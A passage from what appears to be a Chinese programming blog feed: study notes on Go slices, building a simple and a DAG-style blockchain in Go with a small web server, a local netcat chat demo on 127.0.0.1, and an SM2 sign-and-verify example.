title="函数传参"></a>函数传参</h2><p>数组和切片很像，但是在调用的时候他们传递的类型是不同的！</p><ul><li>Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是 <strong>值传递</strong>，函数中的修改对调用者不可见</li><li>Go 语言中对数组的处理，一般采用 <strong>切片</strong> 的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于 <strong>指针传递</strong>，函数中的修改对调用者可见。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 数组</span><br>b := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">boo</span><span class="hljs-params">(tt [6]<span class="hljs-keyword">int</span>)</span></span> &#123;<br>    tt[<span class="hljs-number">0</span>], tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>] = tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>], tt[<span class="hljs-number">0</span>]<br>&#125;<br>boo(b)<br>fmt.Println(b) <span class="hljs-comment">// [2 3 5 7 11 13]</span><br><span class="hljs-comment">// 切片</span><br>p := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">poo</span><span class="hljs-params">(tt []<span class="hljs-keyword">int</span>)</span></span> &#123;<br>    tt[<span class="hljs-number">0</span>], tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>] = tt[<span class="hljs-built_in">len</span>(tt)<span class="hljs-number">-1</span>], tt[<span class="hljs-number">0</span>]<br>&#125;<br>poo(p)<br>fmt.Println(p)  <span class="hljs-comment">// [13 3 5 7 11 2]</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DAG区块链和传统区块链搭建异同</title>
      <link href="/2021/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C/"/>
      <url>/2021/DAG%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BC%A0%E7%BB%9F%E5%8C%BA%E5%9D%97%E9%93%BE%E6%90%AD%E5%BB%BA%E5%BC%82%E5%90%8C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="区块数据类型区别"><a href="#区块数据类型区别" class="headerlink" title="区块数据类型区别"></a>区块数据类型区别</h1><p>dag 的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// blockNode represents a block within the DAG</span><br><span class="hljs-keyword">type</span> blockNode <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> Additions, deletions, or modifications to the order of the</span><br><span class="hljs-comment">// definitions in this struct should not be changed without considering</span><br><span class="hljs-comment">// how it affects alignment on 64-bit platforms.  The current order is</span><br><span class="hljs-comment">// specifically crafted to result in minimal padding.  There will be</span><br><span class="hljs-comment">// hundreds of thousands of these in memory, so a few extra bytes of</span><br><span class="hljs-comment">// padding adds up.</span><br><br><span class="hljs-comment">// parents are the parent block for this node.</span><br>parents []*blockNode<br><br><span class="hljs-comment">// parent metadata like version and extra data</span><br>parentMetadata []*parentInfo<br><br>parentVersion <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// hash is the double sha 256 of the block.</span><br>hash chainhash.Hash<br><br><span class="hljs-comment">// workSum is the total amount of work in the chain up to and including</span><br><span class="hljs-comment">// this node.</span><br>workSum *big.Int<br><br><span class="hljs-comment">// height is parentsMaxHeight + 1</span><br>height <span class="hljs-keyword">int32</span><br><br><span class="hljs-comment">// Some fields from block headers to</span><br><span class="hljs-comment">// reconstruct headers from memory.  These must be treated as</span><br><span class="hljs-comment">// immutable and are intentionally ordered to avoid padding on 64-bit</span><br><span class="hljs-comment">// platforms.</span><br>version    <span class="hljs-keyword">int32</span><br>bits       <span class="hljs-keyword">uint32</span><br>nonce      <span class="hljs-keyword">uint32</span><br>timestamp  <span class="hljs-keyword">int64</span><br>merkleRoot chainhash.Hash<br><br>&#125;<br><br><span class="hljs-keyword">type</span> parentInfo <span class="hljs-keyword">struct</span> &#123;<br>hash chainhash.Hash<br>data [<span class="hljs-number">32</span>]<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p>block 的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Block <span class="hljs-keyword">struct</span> &#123;<br>    Index     <span class="hljs-keyword">int</span><br>    Timestamp <span class="hljs-keyword">string</span><br>    BPM       <span class="hljs-keyword">int</span><br>    Hash      <span class="hljs-keyword">string</span><br>    PrevHash  <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Index 是这个块在整个链中的位置</li><li>Timestamp 显而易见就是块生成时的时间戳</li><li>Hash 是这个块通过 SHA256 算法生成的散列值</li><li>PrevHash 代表前一个块的 SHA256 散列值</li><li>BPM 每分钟心跳数，也就是心率。–不太清楚干什么用的</li></ul><p>接着，我们再定义一个结构表示整个链，最简单的表示形式就是一个 Block 的数组：<br><code>var ``Blockchain`` []``Block</code><br>可以看出来，在 go 里面，是<strong>先写变量名，再写类型（比如*，[]），然后是最终类型。</strong></p><h1 id="通信系统"><a href="#通信系统" class="headerlink" title="通信系统"></a>通信系统</h1><h2 id="比特币网络"><a href="#比特币网络" class="headerlink" title="比特币网络"></a>比特币网络</h2><p>首先，比特币网络中的节点主要有四大功能：<strong>钱包、挖矿、区块链数据库、网络路由</strong>。每个节点都会具备路由功能，但其他功能不一定都具备，不同类型的节点可能只包含部分功能，一般只有<strong>比特币核心(bitcoin core)**节点才会包含所有四大功能。<br>所有节点都会参与校验和广播交易及区块信息，且会发现和维持与其他节点的连接。有些节点会包含完整的区块链数据库，包括所有交易数据，这种节点也称为</strong>全节点(Full Node)<strong>。另外一些节点只存储了区块链数据库的一部分，一般只存储区块头而不存储交易数据，它们会通过“</strong>简化交易验证(SPV)<strong>”的方式完成交易校验，这样的节点也称为  **SPV 节点</strong>或<strong>轻节点(Lightweight Node)**。钱包一般是 PC 或手机客户端的功能，用户通过钱包查看自己的账户金额、管理钱包地址和私钥、发起交易等。除了比特币核心钱包是全节点之外，大部分钱包都是</strong>轻节点<strong>。挖矿节点则通过解决</strong>工作量证明(PoW)<strong>算法问题，与其他挖矿节点相互竞争创建新区块。有些挖矿节点同时也是</strong>全节点<strong>，即也存储了完整的区块链数据库，这种节点一般都是</strong>独立矿工(Solo Miner)**。<br>我们知道，矿工创建新区块后，是需要广播给全网所有节点的，当全网都接受了该区块，给矿工的挖矿奖励才算是有效的，这之后才好开始下一个区块 Hash 的计算。所以矿工必须最大限度缩短新区块的广播和下一个区块 Hash 计算之间的时间。</p><h2 id="初试牛刀"><a href="#初试牛刀" class="headerlink" title="初试牛刀"></a>初试牛刀</h2><p>我猜你一定对传统的 web 服务及开发非常熟悉，所以这部分你肯定一看就会。 借助 Gorilla/mux 包，我们先写一个函数来初始化我们的 web 服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;<br>    mux := makeMuxRouter()<br>    httpAddr := os.Getenv(<span class="hljs-string">&quot;ADDR&quot;</span>)<br>    log.Println(<span class="hljs-string">&quot;Listening on &quot;</span>, os.Getenv(<span class="hljs-string">&quot;ADDR&quot;</span>))<br>    s := &amp;http.Server&#123;<br>        Addr:           <span class="hljs-string">&quot;:&quot;</span> + httpAddr,<br>        Handler:        mux,<br>        ReadTimeout:    <span class="hljs-number">10</span> * time.Second,<br>        WriteTimeout:   <span class="hljs-number">10</span> * time.Second,<br>        MaxHeaderBytes: <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> err := s.ListenAndServe(); err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> err<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中的端口号是通过前面提到的 .env 来获得，再添加一些基本的配置参数，这个 web 服务就已经可以 listen and serve 了！ 接下来我们再来定义不同 endpoint 以及对应的 handler。例如，对“/”的 GET 请求我们可以查看整个链，“/”的 POST 请求可以创建块。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeMuxRouter</span><span class="hljs-params">()</span> <span class="hljs-title">http</span>.<span class="hljs-title">Handler</span></span> &#123;<br>    muxRouter := mux.NewRouter()<br>    muxRouter.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handleGetBlockchain).Methods(<span class="hljs-string">&quot;GET&quot;</span>)<br>    muxRouter.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, handleWriteBlock).Methods(<span class="hljs-string">&quot;POST&quot;</span>)<br>    <span class="hljs-keyword">return</span> muxRouter<br>&#125;<br></code></pre></td></tr></table></figure><p>GET 请求的 handler：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handleGetBlockchain</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>    bytes, err := json.MarshalIndent(Blockchain, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        http.Error(w, err.Error(), http.StatusInternalServerError)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    io.WriteString(w, <span class="hljs-keyword">string</span>(bytes))<br>&#125;<br></code></pre></td></tr></table></figure><p>为了简化，我们直接以 JSON 格式返回整个链，你可以在浏览器中访问 localhost:8080 或者 127.0.0.1:8080 来查看（这里的 8080 就是你在 .env 中定义的端口号 ADDR）。<br>POST 请求的 handler 稍微有些复杂，我们先来定义一下 POST 请求的 payload：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Message <span class="hljs-keyword">struct</span> &#123;<br>    BPM <span class="hljs-keyword">int</span><br>&#125;<br></code></pre></td></tr></table></figure><p>再看看 handler 的实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handleWriteBlock</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>    <span class="hljs-keyword">var</span> m Message<br>    decoder := json.NewDecoder(r.Body)<br>    <span class="hljs-keyword">if</span> err := decoder.Decode(&amp;m); err != <span class="hljs-literal">nil</span> &#123;<br>        respondWithJSON(w, r, http.StatusBadRequest, r.Body)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">defer</span> r.Body.Close()<br>    newBlock, err := generateBlock(Blockchain[<span class="hljs-built_in">len</span>(Blockchain)<span class="hljs-number">-1</span>], m.BPM)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        respondWithJSON(w, r, http.StatusInternalServerError, m)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> isBlockValid(newBlock, Blockchain[<span class="hljs-built_in">len</span>(Blockchain)<span class="hljs-number">-1</span>]) &#123;<br>        newBlockchain := <span class="hljs-built_in">append</span>(Blockchain, newBlock)<br>        replaceChain(newBlockchain)<br>        spew.Dump(Blockchain)<br>    &#125;<br>    respondWithJSON(w, r, http.StatusCreated, newBlock)<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的 POST 请求体中可以使用上面定义的 payload，比如：<br><code>&#123;``&quot;BPM&quot;``:``75``&#125;</code><br>还记得前面我们写的 generateBlock 这个函数吗？它接受一个“前一个块”参数，和一个 BPM 值。POST handler 接受请求后就能获得请求体中的 BPM 值，接着借助生成块的函数以及校验块的函数就能生成一个新的块了！<br>除此之外，你也可以：</p><ul><li>使用 spew.Dump 这个函数可以以非常美观和方便阅读的方式将 struct、slice 等数据打印在控制台里，方便我们调试。</li><li>测试 POST 请求时，可以使用 POSTMAN 这个 chrome 插件，相比 curl 它更直观和方便。</li></ul><p>POST 请求处理完之后，无论创建块成功与否，我们需要返回客户端一个响应：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">respondWithJSON</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request, code <span class="hljs-keyword">int</span>, payload <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>    response, err := json.MarshalIndent(payload, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        w.WriteHeader(http.StatusInternalServerError)<br>        w.Write([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;HTTP 500: Internal Server Error&quot;</span>))<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    w.WriteHeader(code)<br>    w.Write(response)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="快要大功告成了"><a href="#快要大功告成了" class="headerlink" title="快要大功告成了"></a>快要大功告成了</h3><p>接下来，我们把这些关于区块链的函数，web 服务的函数“组装”起来：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    err := godotenv.Load()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        log.Fatal(err)<br>    &#125;<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        t := time.Now()<br>        genesisBlock := Block&#123;<span class="hljs-number">0</span>, t.String(), <span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>&#125;<br>        spew.Dump(genesisBlock)<br>        Blockchain = <span class="hljs-built_in">append</span>(Blockchain, genesisBlock)<br>    &#125;()<br>    log.Fatal(run())<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>genesisBlock</code> （创世块）是 main 函数中最重要的部分，通过它来初始化区块链，毕竟第一个块的 PrevHash 是空的。</p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><p><a href="https://github.com/omnigeeker/golang_blockchain_demo/tree/master/networking">https://github.com/omnigeeker/golang_blockchain_demo/tree/master/networking</a><br>在参考这个步骤的时候，发现始终无法监听到 8000 端口的信息，晚上苦苦思索一个小时没有任何解决思路，今天早上又看了一下，发现我没有改文件？？？？我还是用第一个 demo 文件来模拟多节点，笑死。<br>赶紧创建文件，复制粘贴。<br>bingo！<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617329027026-7e269a37-d2bb-452c-b7fb-59e425dec587.png#height=203&id=sjAuI&name=image.png&originHeight=405&originWidth=1361&originalType=binary&size=1018627&status=done&style=none&width=680.5" alt="image.png"><br>这里设置的每 30 秒广播一次区块信息，所以如果一直监听可能会遇到这样的情况：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617329633755-0fcdce90-5cfe-4a57-b4d0-5baaa8860919.png#height=388&id=W1t1G&name=image.png&originHeight=776&originWidth=1345&originalType=binary&size=1812987&status=done&style=none&width=672.5" alt="image.png"><br>注意：这里的 nc 命令和文章中提到的不一样，文章中简单的<code>nc localhost 8000</code>当然可以用，但是这样更规范，它相当于模拟了一个客户端，开放 5000 端口和主机地址的 8000 端口进行通信。<br>用它，甚至可以模拟一个简易的聊天室！<br>nc 的本质是在两台机器之间建立连接，之后就可以基于这个连接做很多事情，数据传输是其中一个最为基本的。我们下面就使用 nc 来建立一个 C/S 的聊天室。<br>模拟 Server 端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -v ：输出详细信息</span><br><span class="hljs-meta">#</span><span class="bash"> -l ：指定监听地址和端口</span><br>nc -v -l 127.0.0.1 6000<br></code></pre></td></tr></table></figure><p>模拟 Client 端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -p : 指定源端口</span><br>nc -v -p 5000 localhost 6000<br></code></pre></td></tr></table></figure><p>之后，Client 和 Server 端就可以相互聊天了。<br>Client：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> nc -v -p 5000 localhost 6000</span><br>nc: connect to localhost port 6000 (tcp) failed: Connection refused<br>Connection to localhost 6000 port [tcp/x11] succeeded!<br>Hi, server<br>Hi, client<br></code></pre></td></tr></table></figure><p>Server：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> nc -v -l 127.0.0.1 6000</span><br>Listening on [127.0.0.1] (family 0, port 6000)<br>Connection from [127.0.0.1] port 6000 [tcp/x11] accepted (family 2, sport 5000)<br>Hi, server<br>Hi, client<br></code></pre></td></tr></table></figure><p>nc 具体操作可以参考：<br>【1】<a href="https://www.cnblogs.com/bakari/p/10898604.html">https://www.cnblogs.com/bakari/p/10898604.html</a><br>【2】<a href="https://www.huaweicloud.com/articles/7f323edef71be76eb5705275718ecfef.html">https://www.huaweicloud.com/articles/7f323edef71be76eb5705275718ecfef.html</a><br>【3】<a href="https://www.cnblogs.com/zhaijiahui/p/9028402.html">https://www.cnblogs.com/zhaijiahui/p/9028402.html</a><br>【4】<a href="https://phpor.net/blog/post/225">https://phpor.net/blog/post/225</a></p><h2 id="p2p-多节点网络"><a href="#p2p-多节点网络" class="headerlink" title="p2p 多节点网络"></a>p2p 多节点网络</h2><p><a href="https://github.com/corgi-kx/blockchain_golang/blob/master/network/server.go">https://github.com/corgi-kx/blockchain_golang/blob/master/network/server.go</a><br>我认为需要先在单节点完成 dag 架构的 pow 之后再尝试多节点通讯，所以这里暂时搁置。</p><h1 id="DAG"><a href="#DAG" class="headerlink" title="DAG"></a>DAG</h1><h1 id="SPECTRE-共识"><a href="#SPECTRE-共识" class="headerlink" title="SPECTRE 共识"></a>SPECTRE 共识</h1><h1 id="账户系统与交易签名"><a href="#账户系统与交易签名" class="headerlink" title="账户系统与交易签名"></a>账户系统与交易签名</h1><p>前置知识：<br>【1】<a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验</a><br>【2】<a href="https://aaron67.cc/2020/10/10/bitcoin-sign-transaction/">比特币交易中的签名</a><br>【3】<a href="https://blog.csdn.net/AAA123524457/article/details/107693278">比特币交易中的签名与验证</a></p><h2 id="国密-SM2"><a href="#国密-SM2" class="headerlink" title="国密 SM2"></a>国密 SM2</h2><p>流程：<a href="https://blog.csdn.net/samsho2/article/details/80770862">https://blog.csdn.net/samsho2/article/details/80770862</a><br>详细原理：<br>【1】<a href="https://learnblockchain.cn/article/1515">SM2 算法与 KDF 密钥导出函数</a><br>【2】<a href="https://learnblockchain.cn/article/1507">SM2 的签名和验证过程</a><br>以上均要写在本子里<br>“github.com/paul-lee-attorney/gm/sm2” 这个库将所有代码都注释了，非常好，可以直接用<br><a href="https://pkg.go.dev/github.com/paul-lee-attorney/gm/sm2">https://pkg.go.dev/github.com/paul-lee-attorney/gm/sm2</a> 这是它的用法<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1617595492500-8f6a9ee5-6096-478b-b968-d39a5caa7134.png#height=386&id=P6Coj&name=image.png&originHeight=771&originWidth=998&originalType=binary&size=54825&status=done&style=none&width=499" alt="image.png"><br>这个函数可以用在本子里，提升逼格。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/rand&quot;</span><br><span class="hljs-string">&quot;encoding/hex&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>_ <span class="hljs-string">&quot;time&quot;</span><br><span class="hljs-comment">//&quot;github.com/rongzer/gm/sm2&quot;</span><br><span class="hljs-string">&quot;github.com/paul-lee-attorney/gm/sm2&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-comment">//fmt.Println(time.Now().Format(&quot;2006-01-02 15:04:05&quot;))</span><br><span class="hljs-comment">//fmt.Println(time.Now().Unix())</span><br><span class="hljs-comment">//bf := bbloom.New(float64(1&lt;&lt;12), float64(0.01))</span><br><span class="hljs-comment">//bf.Add([]byte(&quot;butter&quot;))</span><br><span class="hljs-comment">////Json := bf.JSONMarshal()</span><br><span class="hljs-comment">//var set = bf.ShowBitset()</span><br><span class="hljs-comment">////var value  = 0</span><br><span class="hljs-comment">////for _,v := range set&#123;</span><br><span class="hljs-comment">////value += int(v)</span><br><span class="hljs-comment">////&#125;</span><br><span class="hljs-comment">//fmt.Println(len(set))</span><br><span class="hljs-comment">//priv, err := sm2.GenerateKey(rand.Reader) // 生成密钥对</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatal(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//msg := []byte(&quot;Tongji Fintech Research Institute&quot;)</span><br><span class="hljs-comment">//pub := &amp;priv.PublicKey</span><br><span class="hljs-comment">//sign,err := priv.Sign(rand.Reader, msg, nil)  //sm2签名</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//log.Fatal(err)</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(*pub)</span><br><span class="hljs-comment">//isok := pub.Verify(msg, sign)    //sm2验签</span><br><span class="hljs-comment">//fmt.Printf(&quot;Verified: %v\n&quot;, isok)</span><br>msg := []<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;test message 123012301230&quot;</span>)<br><span class="hljs-comment">// 创建公私钥</span><br>priKey, _ := sm2.GenerateKey(rand.Reader)<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 签名</span><br>sign, err := sm2.Sign(priKey,<span class="hljs-literal">nil</span>, msg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;sign:%s\n&quot;</span>, hex.EncodeToString(sign))<br>fmt.Println(<span class="hljs-string">&quot;prikey:\n&quot;</span>,priKey.GetRawBytes())<br><br>fmt.Printf(<span class="hljs-string">&quot;prikey:%s\n&quot;</span>,hex.EncodeToString(priKey.GetRawBytes()))<br>fmt.Printf(<span class="hljs-string">&quot;pubkey:%s\n&quot;</span>,hex.EncodeToString(priKey.PublicKey.GetRawBytes()))<br><br>src := hex.EncodeToString(priKey.GetRawBytes())<br>n, err :=  hex.DecodeString(src)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Println(n)<br><span class="hljs-comment">// 验签</span><br><span class="hljs-keyword">var</span> res <span class="hljs-keyword">bool</span><br>res,err = sm2.Verify(&amp;priKey.PublicKey,<span class="hljs-literal">nil</span>,msg, sign)<br><span class="hljs-comment">//if err != nil&#123;</span><br><span class="hljs-comment">//panic(err)</span><br><span class="hljs-comment">//&#125;</span><br>fmt.Println(res)<br><br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img 